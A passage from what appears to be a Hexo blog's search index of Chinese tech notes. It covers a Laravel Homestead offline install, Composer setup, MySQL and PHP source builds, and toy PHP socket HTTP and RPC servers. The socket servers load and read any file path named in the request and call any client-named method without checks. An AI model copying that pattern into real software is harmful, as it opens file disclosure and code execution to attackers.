pd.cut(result[<span class="string">'real_amount'</span>],bins=[5000,10000,20000,50000,100000,200000],right=False,labels=levels)</span><br><span class="line">    <span class="built_in">print</span>(rank)</span><br></pre></td></tr></table></figure></li></ul><p><img src="用户等级.png" alt=""></p><p>这里使用了公司商城用户数据，看来用户都挺肥的，这里使用了pandas的dataframe结构，groupby分组，以及cut分类,具体用法可以查看手册，类似这样子统计话，我们可以将用户的等级塞入到Redis中，下单的时候，再根据用户等级进行打折什么的。</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>laravel-1 离线安装Homestead Vagrant Box以及配置Composer多线程下载组件</title>
      <link href="/2017/10/18/Box%E4%BB%A5%E5%8F%8A%E9%85%8D%E7%BD%AEComposer%E5%A4%9A%E7%BA%BF%E7%A8%8B%E4%B8%8B%E8%BD%BD%E7%BB%84%E4%BB%B6/"/>
      <url>/2017/10/18/Box%E4%BB%A5%E5%8F%8A%E9%85%8D%E7%BD%AEComposer%E5%A4%9A%E7%BA%BF%E7%A8%8B%E4%B8%8B%E8%BD%BD%E7%BB%84%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<p> 离线安装Homestead Vagrant Box<br><a id="more"></a></p><p>由于国内不可抗的因素，每次学习laravel都会卡在环境配置的这里，因此这里分享在windows下离线安装Homestead Vagrant Box</p><p><a href="https://d.laravel-china.org/docs/5.4/homestead" target="_blank" rel="noopener">homestead配置安装</a></p><p>这里选择的是virtual box，请提前安装 VirtualBox 5.1， Vagrant ，上述官方教程有说明</p><p>在第二步配置的时候，经常会不成功或者下载速度很久，现在分享一个Homestead Vagrant Box,里面有安装教程<br><a href="http://pan.baidu.com/s/1bpD93Rp" target="_blank" rel="noopener">戳这里</a>，密码:b35l</p><p>注意：</p><p>安装的时候注意：homestead文件夹也要使用文件里的那个哦，也就是说，将之前通过git clone那一步复制的github homestead文件夹删掉，用文件里的替代，然后在git里面cd到homestead文件夹，执行bash init.sh,由于群里这个homestead文件夹版本是比较新的，所以执行了init以后，新产生的homestead.yaml等配置文件就直接还在这个homestead文件夹下，而不是老版本homestead那样单独放到一个隐藏文件夹了。</p><h2 id="Composer多线程安装下载组件"><a href="#Composer多线程安装下载组件" class="headerlink" title="Composer多线程安装下载组件"></a>Composer多线程安装下载组件</h2><p>前提：<br>先设置composer的国内镜像设置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer config -g repo.packagist composer https://packagist.phpcomposer.com</span><br></pre></td></tr></table></figure><p>我们正在使用laravel项目的时候会使用很多依赖，我们在composer.json配置之后，需要执行composer install upodate更新下载依赖</p><p>默认，composer安装组件是单线程的，一个一个安装，中间一旦有那个组件慢了，就会拖死后面的下载，这也是单线程的缺点吧</p><p>实现多线程下载的方法：</p><p>安装一个全局插件 hirak/prestissimo</p><p>全局安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">omposer global require hirak/prestissimo</span><br></pre></td></tr></table></figure><p>后续再composer install update的时候就是多线程了</p><p><img src="Box以及配置Composer多线程下载组件\多线程composer.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>mysql编译安装折腾</title>
      <link href="/2017/10/15/mysql%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85%E6%8A%98%E8%85%BE/"/>
      <url>/2017/10/15/mysql%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85%E6%8A%98%E8%85%BE/</url>
      
        <content type="html"><![CDATA[<p>安装环境:ubuntu<br><a id="more"></a></p><h2 id="下载安装MySQL"><a href="#下载安装MySQL" class="headerlink" title="下载安装MySQL"></a>下载安装MySQL</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://dev.mysql.com/downloads/mysql/</span><br></pre></td></tr></table></figure><p>选择 source code</p><p><img src="souece_code.png" alt=""></p><p>在下拉列表中选择最后一个选项</p><p><img src="boot_version.png" alt=""></p><h2 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h2><p>下述这些依赖开始编译的时候，报错会要求安装一下这些库文件</p><h3 id="cmake"><a href="#cmake" class="headerlink" title="cmake"></a>cmake</h3><p>cmake是一个款平台的安装编译工具，能够输出各种各样的makefile</p><pre><code>apt-get install cmake -y</code></pre><h3 id="bootst"><a href="#bootst" class="headerlink" title="bootst"></a>bootst</h3><p>c++语言标准库提供扩展的一些c++库的总称<br>因为我们下载的是带bootst的mysql5.7源码包，因此在这里我们不需要安装这个类库</p><h3 id="git"><a href="#git" class="headerlink" title="git"></a>git</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install git -y</span><br></pre></td></tr></table></figure><h3 id="linux常用的图形库"><a href="#linux常用的图形库" class="headerlink" title="linux常用的图形库"></a>linux常用的图形库</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">apt-get install libncurses5 libncurses5-dev -y</span><br></pre></td></tr></table></figure><h2 id="开始预编译"><a href="#开始预编译" class="headerlink" title="开始预编译"></a>开始预编译</h2><h3 id="新建mysql目录"><a href="#新建mysql目录" class="headerlink" title="新建mysql目录"></a>新建mysql目录</h3><p>在/usr/local新建mysql目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sudo mkdir mysql</span><br></pre></td></tr></table></figure><h3 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h3><p>在我们解压过后的mysql文件目录下预编译<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line">cmake . -DCMAKE_INSTALL_PREFIX=/usr/<span class="built_in">local</span>/mysql -DSYSCONFDIR=/etc -DDEFAULT_CHARSET=utf8 -DDEFAULT_COLLATION=utf8_general_ci -DMYSQL_DATADIR=/usr/<span class="built_in">local</span>/mysql/data -DWITH_BOOST=boost</span><br></pre></td></tr></table></figure></p><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><h3 id="编译成功"><a href="#编译成功" class="headerlink" title="编译成功"></a>编译成功</h3><p><img src="mysql_install.png" alt=""></p><h3 id="初始化mysql"><a href="#初始化mysql" class="headerlink" title="初始化mysql"></a>初始化mysql</h3>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>linux下php编译安装以及各种扩展的安装</title>
      <link href="/2017/10/13/php%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85/"/>
      <url>/2017/10/13/php%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<p>网上查了一大篇php的安装教程，都写的很详细，无脑按照教程配置的话，还是可以配置好整个php环境，但是对于步骤还有原理理解上还是不太熟悉，这样子每次都需要查下教程安装环境，稍显low<br>以下记录了在linux下折腾编译安装php以及扩展的学习笔记。<br><a id="more"></a></p><h1 id="php编译安装"><a href="#php编译安装" class="headerlink" title="php编译安装"></a>php编译安装</h1><h2 id="linux下使用GNU的AUTOCONF和AUTOMAKE产生的程序的安装步骤"><a href="#linux下使用GNU的AUTOCONF和AUTOMAKE产生的程序的安装步骤" class="headerlink" title="linux下使用GNU的AUTOCONF和AUTOMAKE产生的程序的安装步骤"></a>linux下使用GNU的AUTOCONF和AUTOMAKE产生的程序的安装步骤</h2><ul><li><p>./configure是用来检测你的安装平台的目标特征的。比如它会检测你是不是有CC或GCC，并不是需要CC或GCC，它是个shell脚本。</p></li><li><p>make是用来编译的，它从Makefile中读取指令，然后编译。</p></li><li><p>make install是用来安装的，它也从Makefile中读取指令，安装到指定的位置。</p><h2 id="下载php文件"><a href="#下载php文件" class="headerlink" title="下载php文件"></a>下载php文件</h2></li></ul><p><a href="http://hk2.php.net/downloads.php" target="_blank" rel="noopener">php镜像</a></p><h2 id="解压以及预编译"><a href="#解压以及预编译" class="headerlink" title="解压以及预编译"></a>解压以及预编译</h2><pre><code>tar zxvf php-7.0.24.tar.bz2</code></pre><p>解压之后进行预编译</p><p>configure，这一步一般用来生成 Makefile，为下一步的编译做准备，你可以通过在 configure 后加上参数来对安装进行控制，比如代码:./configure –prefix=/usr 意思是将该软件安装在 /usr 下面，执行文件就会安装在 /usr/bin （而不是默认的 /usr/local/bin),资源文件就会安装在 /usr/share（而不是默认的/usr/local/share）</p><pre><code>cd php-7.0.24</code></pre><p>执行 </p><pre><code>./configure --prefix=/usr/local/php </code></pre><p>表示将php安装在上述目录下，conf放置配置文件</p><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><pre><code>make</code></pre><h2 id="安装到指定目录下"><a href="#安装到指定目录下" class="headerlink" title="安装到指定目录下"></a>安装到指定目录下</h2><pre><code>make isntall</code></pre>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Rpc远程调用的学习笔记</title>
      <link href="/2017/10/11/Rpc%E8%BF%9C%E7%A8%8B%E8%B0%83%E7%94%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2017/10/11/Rpc%E8%BF%9C%E7%A8%8B%E8%B0%83%E7%94%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>RPC：Remote Procedure Call<br>Rpc相信对于单机开发的来说感觉很有逼格，甚至听都没有听过，我们单机开发的话，写个服务类，然后本地调用下，这些程序的特点是服务消费方和服务提供方都是本地调用关系<br>而稍微大型的公司，公司的系统都是由成千上万大大小小的服务组成，各服务部署在不同的机器上。由不同的团队来进行维护和负责，程序的特点是服务消费方和服务提供方式远程调用关系<br><a id="more"></a></p><p>本篇文章模拟远程调用并探究其原理<br>本片文章的内容主要分为以下几部分</p><ul><li>服务端创建socket服务，利用HTTP协议和自己“胡乱”的协议内容来约定调用的类 并监听客户端连接</li><li>客户端调用我们定义的类，并输出数据</li></ul><h2 id="创建服务端"><a href="#创建服务端" class="headerlink" title="创建服务端"></a>创建服务端</h2><h3 id="新建服务类"><a href="#新建服务类" class="headerlink" title="新建服务类"></a>新建服务类</h3><p>service/news.php<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class NewsService</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">function</span> display()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="string">'I am RPC Server'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> showName()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="string">'zhangSan'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>rpcserver.php<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    &lt;?php</span><br><span class="line">    <span class="variable">$socket</span> = socket_create(AF_INET,SOCK_STREAM,SOL_TCP);  // 购买电话机</span><br><span class="line">    socket_bind(<span class="variable">$socket</span>,<span class="string">'127.0.0.1'</span>,8070);  // 绑定电话机</span><br><span class="line">    socket_listen(<span class="variable">$socket</span>,5);   // 开机</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="variable">$client</span>=socket_accept((<span class="variable">$socket</span>));//有人打电话进来</span><br><span class="line">        <span class="variable">$buf</span>=socket_read(<span class="variable">$client</span>,1024);//读取客户端发送的数据</span><br><span class="line">        //如果匹配到是http请求头</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/GET\s\/(.*?)\sHTTP\/1.1/i"</span>,<span class="variable">$buf</span>,<span class="variable">$matches</span>)) &#123;</span><br><span class="line">            //匹配到请求资源的路径</span><br><span class="line">            <span class="variable">$path</span> = <span class="variable">$matches</span>[1];</span><br><span class="line">            //加载类的文件</span><br><span class="line">            <span class="keyword">if</span> (file_exists(<span class="variable">$path</span>)) &#123;</span><br><span class="line">                //加载类文</span><br><span class="line">                require_once <span class="variable">$path</span>;</span><br><span class="line">                //从已经有的类中取出我们想要的类</span><br><span class="line">                <span class="variable">$classes</span> = get_declared_classes();</span><br><span class="line">                //找到最后一个类使我们所需要的</span><br><span class="line">                <span class="variable">$obj_class_name</span> = end(<span class="variable">$classes</span>);</span><br><span class="line">                //实例化调用类</span><br><span class="line">                <span class="variable">$obj</span> = new <span class="variable">$obj_class_name</span>();</span><br><span class="line">                <span class="variable">$result</span> = <span class="string">''</span>;</span><br><span class="line">    </span><br><span class="line">                //匹配自定义协议的调用的方法</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">"/SEVEN\s(.*?)\s/i"</span>,<span class="variable">$buf</span>,<span class="variable">$matches</span>)) &#123;</span><br><span class="line">                    //获取自定义协议中的方法名子</span><br><span class="line">                    <span class="variable">$methodname</span>=<span class="variable">$matches</span>[1];</span><br><span class="line">                    <span class="variable">$result</span>=<span class="variable">$obj</span>-&gt;<span class="variable">$methodname</span>();</span><br><span class="line">                    socket_write(<span class="variable">$client</span>,<span class="variable">$result</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    socket_write(<span class="variable">$client</span>,<span class="string">"no method is required!"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                socket_write(<span class="variable">$client</span>,<span class="string">"file is no exists!"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            //回复</span><br><span class="line">            socket_write(<span class="variable">$client</span>,<span class="string">'hello socket,you an not http!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        socket_close(<span class="variable">$client</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    socket_close(<span class="variable">$socket</span>);</span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line"><span class="comment">## 创建客户端</span></span><br><span class="line">``` bash</span><br><span class="line"></span><br><span class="line">    &lt;?php</span><br><span class="line">    class RpcClient</span><br><span class="line">    &#123;</span><br><span class="line">        public <span class="variable">$service</span>;</span><br><span class="line">        public <span class="variable">$request</span>=<span class="string">''</span>;</span><br><span class="line">        <span class="keyword">function</span> __construct(<span class="variable">$serviceurl</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            //保存解析后的URl</span><br><span class="line">            <span class="variable">$this</span>-&gt;service=parse_url(<span class="variable">$serviceurl</span>);</span><br><span class="line">            //构造基于http协议的请求头</span><br><span class="line">            <span class="variable">$this</span>-&gt;request=<span class="string">'GET '</span>.<span class="variable">$this</span>-&gt;service[<span class="string">'path'</span>].<span class="string">' HTTP/1.1'</span>.PHP_EOL;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">function</span> __call(<span class="variable">$name</span>, <span class="variable">$arguments</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            // TODO: Implement __call() method.</span><br><span class="line">            //创建socket</span><br><span class="line">            <span class="variable">$clinet</span>=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);</span><br><span class="line">            //与服务端建立连接</span><br><span class="line">            socket_connect(<span class="variable">$clinet</span>,<span class="variable">$this</span>-&gt;service[<span class="string">'host'</span>],<span class="variable">$this</span>-&gt;service[<span class="string">'port'</span>]);</span><br><span class="line">            //拼接我们自定义的协议</span><br><span class="line">            <span class="variable">$this</span>-&gt;request.=<span class="string">'SEVEN '</span>.<span class="variable">$name</span>.PHP_EOL;</span><br><span class="line">            socket_write(<span class="variable">$clinet</span>,<span class="variable">$this</span>-&gt;request);</span><br><span class="line">    </span><br><span class="line">            //读取服务端的信息</span><br><span class="line">            <span class="variable">$buf</span>=socket_read(<span class="variable">$clinet</span>,1024);</span><br><span class="line">            socket_close(<span class="variable">$clinet</span>);</span><br><span class="line">    </span><br><span class="line">            <span class="built_in">return</span> <span class="variable">$buf</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>启动服务端，我们可以使用下面代码调用我们的远程接口<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">//实例化</span><br><span class="line"><span class="variable">$client</span> = new RpcClient(<span class="string">"http://127.0.0.1:8070/service/news.php"</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$client</span>-&gt;display();</span><br></pre></td></tr></table></figure></p><p>输出我们服务端的新闻类方法的输出<br><img src="rpc输出.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rpc </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>php_socket学习之旅-2</title>
      <link href="/2017/10/11/php-socket%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85-2/"/>
      <url>/2017/10/11/php-socket%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85-2/</url>
      
        <content type="html"><![CDATA[<p>上篇文章文章我们使用打电话类比socket，那么电话打通了，跟电话里的人沟通的时候，我们需要讲同一种语言，我们才能够互相友好的交流，不然，就会像下图一样<br><a id="more"></a></p><p><img src="协议.png" alt=""><br>为了避免这种尴尬，大家都需要有一种统一的语言，就像我们从小就要被教导学习英语一样，那么在web中，http协议就是客户端与服务端经常使用的统一语言了，本篇文章就是我们使用http“打电话”进行沟通，使用socket通过http协议进行客户端和服务端的交互</p><h1 id="查看遵循http协议的浏览器客户端访问时的请求数据"><a href="#查看遵循http协议的浏览器客户端访问时的请求数据" class="headerlink" title="查看遵循http协议的浏览器客户端访问时的请求数据"></a>查看遵循http协议的浏览器客户端访问时的请求数据</h1><h2 id="启动客户端"><a href="#启动客户端" class="headerlink" title="启动客户端"></a>启动客户端</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$socket</span> = socket_create(AF_INET,SOCK_STREAM,SOL_TCP);  // 购买电话机</span><br><span class="line">socket_bind(<span class="variable">$socket</span>,<span class="string">'127.0.0.1'</span>,8070);  // 绑定电话机</span><br><span class="line">socket_listen(<span class="variable">$socket</span>,5);   // 开机</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">    <span class="variable">$client</span> = socket_accept(<span class="variable">$socket</span>);   // 有人打电话进来</span><br><span class="line">    <span class="variable">$buf</span> = socket_read(<span class="variable">$client</span>,1024);   // 一次读取1024的长度</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$buf</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/GET\s\/(.*?)\sHTTP\/1.1/i"</span>,<span class="variable">$buf</span>,<span class="variable">$matches</span>))&#123;</span><br><span class="line">        var_export(<span class="variable">$matches</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // 回复</span><br><span class="line">    socket_write(<span class="variable">$client</span>,<span class="string">'hello socket'</span>);</span><br><span class="line">    socket_close(<span class="variable">$client</span>);  // 关掉客户端</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">socket_close(<span class="variable">$socket</span>);  // 关机</span><br></pre></td></tr></table></figure><h2 id="浏览器访问"><a href="#浏览器访问" class="headerlink" title="浏览器访问"></a>浏览器访问</h2><p>访问<a href="http://127.0.0.1:9090/news/index.html" target="_blank" rel="noopener">http://127.0.0.1:9090/news/index.html</a></p><h2 id="查看服务端窗口输出头"><a href="#查看服务端窗口输出头" class="headerlink" title="查看服务端窗口输出头"></a>查看服务端窗口输出头</h2><pre><code>GET /news/index.html HTTP/1.1Host: 127.0.0.1:9090Connection: keep-aliveCache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Encoding: gzip, deflate, sdch, brAccept-Language: zh-CN,zh;q=0.8,en;q=0.6</code></pre><h2 id="模拟服务端遵循http协议响应返回数据"><a href="#模拟服务端遵循http协议响应返回数据" class="headerlink" title="模拟服务端遵循http协议响应返回数据"></a>模拟服务端遵循http协议响应返回数据</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$socket</span> = socket_create(AF_INET,SOCK_STREAM,SOL_TCP);  // 购买电话机</span><br><span class="line">socket_bind(<span class="variable">$socket</span>,<span class="string">'127.0.0.1'</span>,8070);  // 绑定电话机</span><br><span class="line">socket_listen(<span class="variable">$socket</span>,5);   // 开机</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">    <span class="variable">$client</span> = socket_accept(<span class="variable">$socket</span>);   // 有人打电话进来</span><br><span class="line">    <span class="variable">$buf</span> = socket_read(<span class="variable">$client</span>,1024);   // 一次读取1024的长度</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$buf</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/GET\s\/(.*?)\sHTTP\/1.1/i"</span>,<span class="variable">$buf</span>,<span class="variable">$matches</span>))&#123;</span><br><span class="line">        <span class="variable">$page_path</span> = <span class="variable">$matches</span>[1]; // 文件在本地的路径</span><br><span class="line">        <span class="keyword">if</span>(file_exists(<span class="variable">$page_path</span>))&#123;</span><br><span class="line">            //拼接HTTP响应格式</span><br><span class="line">            <span class="variable">$html_content</span> = <span class="string">'HTTP/1.1 200 OK'</span>.PHP_EOL</span><br><span class="line">                        .<span class="string">'Content-Type: text/html;'</span>.PHP_EOL</span><br><span class="line">                        .PHP_EOL</span><br><span class="line">                        .file_get_contents(<span class="variable">$page_path</span>);</span><br><span class="line"></span><br><span class="line">            //socket回复给客户端</span><br><span class="line">            socket_write(<span class="variable">$client</span>,<span class="variable">$html_content</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            socket_write(<span class="variable">$client</span>,<span class="string">'404'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        // 回复</span><br><span class="line">        socket_write(<span class="variable">$client</span>,<span class="string">'hello socket'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    socket_close(<span class="variable">$client</span>);  // 关掉客户端</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">socket_close(<span class="variable">$socket</span>);  // 关机</span><br></pre></td></tr></table></figure><p>要有数据返回，我们的资源应该存在<br>在server文件同一目录，我们新建news，并且有一个文件<br>index.html<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">hello world!</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>访问<a href="http://127.0.0.1:8070/news/index.html" target="_blank" rel="noopener">http://127.0.0.1:8070/news/index.html</a><br><img src="资源文件.png" alt=""><br>如果资源不存在，就返回404,是不是很想我们常用的appache的响应，没有错，其实appache最简单的原理也就是socket，<br>现在，我们就可以对服务端响应以及http协议更了解了呢！</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>全文索引与分区学习笔记</title>
      <link href="/2017/09/21/%E5%88%86%E5%8C%BA%E5%AE%9E%E6%88%98/"/>
      <url>/2017/09/21/%E5%88%86%E5%8C%BA%E5%AE%9E%E6%88%98/</url>
      
